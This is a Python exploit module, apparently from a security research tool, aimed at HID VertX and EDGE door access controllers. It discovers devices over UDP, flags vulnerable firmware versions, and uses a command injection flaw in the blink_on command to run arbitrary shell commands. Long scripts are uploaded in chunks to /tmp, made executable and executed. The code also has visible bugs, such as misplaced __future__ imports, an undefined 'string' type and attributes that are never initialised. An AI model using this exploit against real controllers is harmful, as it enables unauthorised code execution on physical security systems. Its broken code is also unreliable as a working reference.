# Copyright (c) 2017, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import re
import requests
import socket
import time

from __future__ import print_function
from __future__ import unicode_literals


class VertXController(object):
	BLINK_ON = 'command_blink_on;044;'
	DISCOVER = 'discover;013;'

	def __init__(self, ip):
		self.ip = ip

	def send_command(self, command, ip, payload=None):
		"""
		Send a command to the VertX controller.
		"""
		if re.match(r'(^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$)', ip):
			if payload:
				command += payload

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.settimeout(5)

			if ip == '255.255.255.255':
				s.bind(('', 0))
				s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

			try:
				s.sendto(command, (ip, 4070))
				response = s.recvfrom(1024)
				s.close()
			except socket.timeout:
				raise Exception('VertX controller did not respond')
		else:
			raise Exception('Invalid IP address provided')

		return response

	def inject_command(self, commands):
		"""
		Trigger command injection vulnerability.
		"""
		# If command is a string and <= 41 characters
		if type(commands) is string and len(commands) <= 41:
			payload = "{0};1`{1}`;".format(self.vertx_info['mac'], commands)
			response = self.send_command(self.BLINK_ON, payload=payload)

		# If multiple commands in a list, and the longest command is <= 41 characters
		elif type(commands) is list and len(max(commands, key=len)) <= 41:
			for command in commands:
				payload = "{0};1`{1}`;".format(self.vertx_info['mac'], command)
				response = self.send_command(self.BLINK_ON, payload=payload)
				if response[0].split(';')[0] == 'ack':
					time.sleep(1)
				else:
					return response

		else:
			# If command in a string, and > 41 characters
			if type(commands) is string:
				commands = [commands]

			# If multiple commands in a list, and the longest command is > 41 characters
			command_chunks = list('!'.join(commands)[0 + i:24 + i] for i in range(0, len('!'.join(commands)), 24))
			for command in command_chunks:
				payload = "{0};1`echo '{1}' >> /tmp/a`;".format(self.vertx_info['mac'], command)
				response = self.send_command(self.BLINK_ON, payload=payload)
				if response[0].split(';')[0] == 'ack':
					time.sleep(1)
				else:
					return response

			# Format and execute the uploaded script
			format_commands = [
				"tr -d '\n' < /tmp/a > /tmp/b",
				"tr '!' '\n' < /tmp/b > /tmp/a",
				"chmod +x /tmp/a",
				"/tmp/a"
			]

			for command in format_commands:
				payload = "{0};1`{1}`;".format(self.vertx_info['mac'], command)
				response = self.send_command(self.BLINK_ON, payload=payload)
				if response[0].split(';')[0] == 'ack':
					time.sleep(1)
				else:
					return response

		return response

	def clean(self, files=None):
		"""
		Delete uploaded files on the VertX controller.
		"""
		commands = [
			'rm /tmp/a',
			'rm /tmp/b'
		]

		if files:
			if type(files) is list:
				for i in range(len(files)):
					files[i] = "rm {0}".format(files[i])
				commands = files
			else:
				commands = "rm {0}".format(files)

		response = self.inject_command(commands)

		return response

	def web_request(self, url):
		"""
		Send request to the VertX web interface.
		"""
		try:
			response = self.session.get(url, verify=False)
		except requests.exceptions.RequestException as error:
			raise Exception('VertX web server did not respond')

		return response

	def info(self):
		"""
		Get information about VertX controller.
		"""
		vertx_info = {
			'raw': None,
			'name': None,
			'model': None,
			'version': None,
			'data': None,
			'ip': None,
			'mac': None,
			'model': None,
			'vulnerable': None
		}

		response = self.send_command(self.DISCOVER, ip=self.ip)
		if response:
			response_data = response[0].split(';')
			vertx_info['raw'] = response
			vertx_info['name'] = response_data[3]
			vertx_info['model'] = response_data[6]
			vertx_info['version'] = response_data[7]
			vertx_info['data'] = response_data[8]
			vertx_info['ip'] = response_data[4]
			vertx_info['mac'] = response_data[2]

			patched_firmware = {
				'E400': 3511483,  # EDGEPlus
				'EH400': 3511483,  # EDGE EVO
				'EHS400': 3511483,  # EDGE EVO Solo
				'ES400': 3511483,  # EDGEPlus Solo
				'V2-V1000': 3511483,  # VertX EVO
				'V2-V2000': 3511483,  # VertX EVO
				'V1000': 227568,  # VertX Legacy
				'V2000': 227568  # VertX Legacy
			}

			if int(vertx_info['version'].replace('.', '')) <= patched_firmware.get(vertx_info['model'], 0):
				vertx_info['vulnerable'] = True
			else:
				vertx_info['vulnerable'] = False

		return vertx_info
